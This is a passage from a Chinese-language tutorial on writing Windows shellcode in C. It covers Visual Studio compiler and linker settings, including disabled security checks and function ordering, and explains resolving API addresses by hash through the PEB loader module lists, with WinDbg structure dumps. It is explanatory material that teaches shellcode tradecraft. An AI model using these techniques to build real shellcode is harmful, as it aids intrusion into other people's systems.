
</code></pre><p>使用这个设置告诉<code>VS 2013</code>只用<code>_inline</code>来定义内联函数。 <code>main()</code> 仅调用<code>shellcode</code>的函数<code>entryPoint</code>。如果函数 <code>entryPoint</code>是简短的，那么它可能会被内联进<code>main()</code>。这将是极糟的，因为<code>main()</code>将不再透露<code>shellcode</code>的后一部分（事实上它包含了该部分）。后面会了解到原因。</p><pre><code>* Enable Intrinsic Functions: Yes (/Oi)
</code></pre><p>我不知道该设置是否应该关闭。</p><pre><code>* Favor Size Or Speed: Favor small code (/Os)

* Whole Program Optimization: Yes (/GL)
</code></pre><ul><li>Code Generation:<ul><li>Security Check: Disable Security Check (/GS-)</li></ul></li></ul><p>不需要安全检查!</p><pre><code>* Enable Function-Level linking: Yes (/Gy)
</code></pre><h4>linker配置</h4><p>通过<code>Project→&lt;project name&gt; properties</code>, 展开<code>Configuration Properties</code>接着查看<code>Linker</code>。应用修改后的<code>Release</code>配置。这里是你需要修改的相关设置：</p><ul><li>General:<ul><li>Enable Incremental Linking: No (/INCREMENTAL:NO)</li></ul></li><li>Debugging:<ul><li>Generate Map File: Yes (/MAP)</li></ul></li></ul><p>告诉<code>linker</code>生成含有<code>EXE</code>结构的映射文件。</p><pre><code>* Map File Name: mapfile
</code></pre><p>这是映射文件名。可自定义文件名。</p><ul><li>Optimization:<ul><li>References: Yes (/OPT:REF)</li></ul></li></ul><p>该选项对于生成简短的<code>shellcode</code>来说非常重要，因为可以除去函数以及不被代码引用的数据。</p><pre><code>* Enable COMDAT Folding: Yes (/OPT:ICF)

* Function Order: function_order.txt
</code></pre><p>应用该设置读取命名为<code>function_order.txt</code> 的文件，该文件指定必须出现在代码节中函数的顺序。我们要将函数 <code>entryPoint</code>变为代码节中的第一个函数，可想而知，<code>function_order.txt</code>中必存在一行代码含有字符串<code>?entryPoint@@YAHXZ</code>。可以在映射文件中找到该函数名。</p><h4>getProcAddrByHash</h4><p>该函数返回由某个出现在内存中的模块（<code>.exe</code>或<code>.dll</code>）导出的某个函hash数的地址，已给出的``值与模块和函数相关联。当然，通过名字查找函数具有一定的可能性，但是这样做需要考虑空间方面的问题，因为那些名字应该被包含在<code>shellcode</code>中。在另一方面，一个<code>hash</code>仅有4个字节。因为我们不使用两个<code>hash</code>（一个用于模块，一个用于函数），<code>getProcAddrByHash</code>需要考虑所有被加载进内存中的模块。</p><p>通过<code>user32.dll</code>导出函数<code>MessageBoxA</code>，该函数的<code>hash</code>值可通过如下方法计算：</p><pre><code>DWORD hash = getFunctionHash("user32.dll", "MessageBoxA");
</code></pre><p>计算出的<code>hash</code>值为<code>getHash</code>(“user32.dll”) 与<code>getHash</code>(“MessageBoxA”)的<code>hash</code>值的总和。函数<code>getHash</code>的实现简明易懂：</p><pre><code>DWORD getHash(const char *str) {
    DWORD h = 0;
    while (*str) {
        h = (h &gt;&gt; 13) | (h &lt;&lt; (32 - 13));       // ROR h, 13
        h += *str &gt;= 'a' ? *str - 32 : *str;    // convert the character to uppercase
        str++;
    }
    return h;
}
</code></pre><p>正如你可以了解到的，<code>hash</code>值是大小写不敏感的（不区分大小写），重要的是，因为在内存中，某种Windows的版本所使用的字符串都为大写。 首先，<code>getProcAddrByHash</code>获取TEB(<code>Thread Environment Block</code>)的地址：</p><pre><code>PEB *peb = getPEB();

where

_inline PEB *getPEB() {
    PEB *p;
    __asm {
        mov     eax, fs:[30h]
        mov     p, eax
    }
    return p;
}
</code></pre><p>选择子<code>fs</code>与某个始于<code>TEB</code>地址的段相关联。在偏移<code>30h</code>上，<code>TEB</code>含有一个PEB(<code>Process Environment Block</code>)指针。用WinDbg可以观察到：</p><pre><code>0:000&gt; dt _TEB @$teb
ntdll!_TEB
+0x000 NtTib            : _NT_TIB
+0x01c EnvironmentPointer : (null)
+0x020 ClientId         : _CLIENT_ID
+0x028 ActiveRpcHandle  : (null)
+0x02c ThreadLocalStoragePointer : 0x7efdd02c Void
+0x030 ProcessEnvironmentBlock : 0x7efde000 _PEB
+0x034 LastErrorValue   : 0
+0x038 CountOfOwnedCriticalSections : 0
+0x03c CsrClientThread  : (null)
&lt;snip&gt;
</code></pre><p><code>PEB</code>与当前的进程相关联，除了别的以外，含有关于某些模块的信息，这些模块都被加载到进程地址空间中。 此处又是<code>getProcAddrByHash</code>：</p><pre><code>PVOID getProcAddrByHash(DWORD hash) {
    PEB *peb = getPEB();
    LIST_ENTRY *first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;
    LIST_ENTRY *ptr = first;
    do {                            // for each module
        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
        ptr = ptr-&gt;Flink;
        .
        .
        .
    } while (ptr != first);
 
    return NULL;            // address not found
}
</code></pre><p>此处为<code>PEB</code>部分:</p><pre><code>0:000&gt; dt _PEB @$peb
ntdll!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x8 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsLegacyProcess  : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 SpareBits        : 0y000
   +0x004 Mutant           : 0xffffffff Void
   +0x008 ImageBaseAddress : 0x00060000 Void
   +0x00c Ldr              : 0x76fd0200 _PEB_LDR_DATA
   +0x010 ProcessParameters : 0x00681718 _RTL_USER_PROCESS_PARAMETERS
   +0x014 SubSystemData    : (null)
   +0x018 ProcessHeap      : 0x00680000 Void
   &lt;snip&gt;
</code></pre><p>在偏移<code>0Ch</code>上，是一个被称作<code>Ldr</code>的字段，它是个<code>PEB_LDR_DATA</code> 结构指针。使用<code>WinDbg</code>进行观察：</p><pre><code>0:000&gt; dt _PEB_LDR_DATA 0x76fd0200
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x30
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null)
   +0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x683080 - 0x6862c0 ]
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY [ 0x683088 - 0x6862c8 ]
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY [ 0x683120 - 0x6862d0 ]
   +0x024 EntryInProgress  : (null)
   +0x028 ShutdownInProgress : 0 ''
   +0x02c ShutdownThreadId : (null)
</code></pre><p><code>InMemoryOrderModuleList</code>是一个<code>LDR_DATA_TABLE_ENTRY</code>结构的双链表，它与当前进程的地址空间中所加载的模块相关联。更确切地说，<code>InMemoryOrderModuleList</code> 是一个<code>LIST_ENTRY</code>，它含有两个部分：</p><pre><code>0:000&gt; dt _LIST_ENTRY
ntdll!_LIST_ENTRY
+0x000 Flink            : Ptr32 _LIST_ENTRY
+0x004 Blink            : Ptr32 _LIST_ENTRY
</code></pre><p><code>Flink</code>为前向链表，<code>Blink</code>为后向链表。<code>Flink</code>指向第一个模块的<code>LDR_DATA_TABLE_ENTRY</code> 。当然，未必就是如此：</p><p><code>Flink</code>指向一个被包含在结构<code>LDR_DATA_TABLE_ENTRY</code>中的<code>LIST_ENTRY</code> 结构。</p><p>我们来观察<code>LDR_DATA_TABLE_ENTRY</code> 是如何被定义的:</p><pre><code>0:000&gt; dt _LDR_DATA_TABLE_ENTRY
ntdll!_LDR_DATA_TABLE_ENTRY
+0x000 InLoadOrderLinks : _LIST_ENTRY
+0x008 InMemoryOrderLinks : _LIST_ENTRY
+0x010 InInitializationOrderLinks : _LIST_ENTRY
+0x018 DllBase          : Ptr32 Void
+0x01c EntryPoint       : Ptr32 Void
+0x020 SizeOfImage      : Uint4B
+0x024 FullDllName      : _UNICODE_STRING
+0x02c BaseDllName      : _UNICODE_STRING
+0x034 Flags            : Uint4B
+0x038 LoadCount        : Uint2B
+0x03a TlsIndex         : Uint2B
+0x03c HashLinks        : _LIST_ENTRY
+0x03c SectionPointer   : Ptr32 Void
+0x040 CheckSum         : Uint4B
+0x044 TimeDateStamp    : Uint4B
+0x044 LoadedImports    : Ptr32 Void
+0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT
+0x04c PatchInformation : Ptr32 Void
+0x050 ForwarderLinks   : _LIST_ENTRY
+0x058 ServiceTagLinks  : _LIST_ENTRY
+0x060 StaticLinks      : _LIST_ENTRY
+0x068 ContextInformation : Ptr32 Void
+0x06c OriginalBase     : Uint4B
+0x070 LoadTime         : _LARGE_INTEGER
</code></pre><p><code>InMemoryOrderModuleList.Flink</code>指向位于偏移为8的<code>_LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks</code>，因此，我们必须减去8来获取 <code>_LDR_DATA_TABLE_ENTRY</code>的地址。</p><p>首先，获取Flink指针:</p><pre><code>+0x00c InLoadOrderModuleList : _LIST_ENTRY [ 0x683080 - 0x6862c0 ]
</code></pre><p>它的值是<code>0x683080</code>，因此<code>_LDR_DATA_TABLE_ENTRY</code> 结构的地址为<code>0x683080 – 8 = 0x683078</code>:</p><pre><code>0:000&gt; dt _LDR_DATA_TABLE_ENTRY 683078
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x359469e5 - 0x1800eeb1 ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x683110 - 0x76fd020c ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x683118 - 0x76fd0214 ]
   +0x018 DllBase          : (null)
   +0x01c EntryPoint       : (null)
   +0x020 SizeOfImage      : 0x60000
   +0x024 FullDllName      : _UNICODE_STRING "蒮ｍ쿟ﾹ엘ﾬ膪ｎ???"
   +0x02c BaseDllName      : _UNICODE_STRING "C:\Windows\SysWOW64\calc.exe"
